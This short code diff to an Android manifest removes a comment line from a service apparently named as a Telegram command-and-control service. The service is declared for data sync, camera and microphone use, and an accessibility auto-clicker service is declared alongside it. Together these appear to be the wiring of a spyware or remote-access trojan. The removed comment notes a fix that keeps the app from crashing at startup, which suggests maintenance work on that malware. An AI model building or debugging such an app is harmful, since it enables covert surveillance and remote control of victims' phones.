@@ -41,7 +41,6 @@
         <service
             android:name=".TelegramC2Service"
             android:exported="false"
-            <!-- ✅ mediaProjection REMOVED from here to prevent startup crash -->
             android:foregroundServiceType="dataSync|camera|microphone" />
 
         <service android:name=".AutoClickerAccessibilityService"
